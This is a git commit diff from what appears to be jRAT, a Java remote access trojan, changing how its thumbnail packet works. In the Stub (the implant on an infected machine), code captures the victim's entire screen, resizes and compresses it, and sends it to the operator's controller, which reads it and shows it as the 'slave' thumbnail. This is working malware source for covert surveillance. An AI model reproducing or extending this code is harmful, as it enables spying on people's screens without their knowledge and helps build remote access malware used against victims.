fd26fc59cfadc9f997da9f764579316c1d15d38f
redpois0n <red@cmail.nu>
2015-03-23 09:06:53 +0100

    Packet33Thumbnails cleaned

--- Controller/src/se/jrat/client/packets/incoming/Packet33Thumbnail.java
+++ Controller/src/se/jrat/client/packets/incoming/Packet33Thumbnail.java
@@ -1,22 +1,21 @@
 package se.jrat.client.packets.incoming;
 
 import java.awt.image.BufferedImage;
-import java.awt.image.DataBufferByte;
 import java.io.DataInputStream;
 
 import javax.swing.ImageIcon;
 
 import se.jrat.client.Slave;
+import se.jrat.common.utils.ImageUtils;
 
 public class Packet33Thumbnail extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
-		BufferedImage image = new BufferedImage(150, 100, BufferedImage.TYPE_3BYTE_BGR);
-		byte[] buffer = ((DataBufferByte) image.getRaster().getDataBuffer()).getData();
-
+		byte[] buffer = new byte[dis.readInt()];
 		slave.getDataInputStream().readFully(buffer);
-
+		
+		BufferedImage image = ImageUtils.decodeImage(buffer);
 		slave.setThumbnail(new ImageIcon(image));
 	}
 
--- Stub/src/se/jrat/stub/packets/outgoing/Packet33Thumbnail.java
+++ Stub/src/se/jrat/stub/packets/outgoing/Packet33Thumbnail.java
@@ -3,7 +3,6 @@ package se.jrat.stub.packets.outgoing;
 import java.awt.Rectangle;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
-import java.awt.image.DataBufferByte;
 import java.io.DataOutputStream;
 
 import se.jrat.common.io.StringWriter;
@@ -17,11 +16,9 @@ public class Packet33Thumbnail extends AbstractOutgoingPacket {
 		Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
 		BufferedImage screenShot = Main.robot.createScreenCapture(screenRect);
 		screenShot = ImageUtils.resize(screenShot, 150, 100);
-		BufferedImage bufferedImage = new BufferedImage(150, 100, BufferedImage.TYPE_3BYTE_BGR);
-		bufferedImage.getGraphics().drawImage(screenShot, 0, 0, null);
 
-		byte[] buffer = ((DataBufferByte) bufferedImage.getRaster().getDataBuffer()).getData();
-
+		byte[] buffer = ImageUtils.encode(screenShot, 0.5F);
+		dos.writeInt(buffer.length);
 		dos.write(buffer);
 	}
 
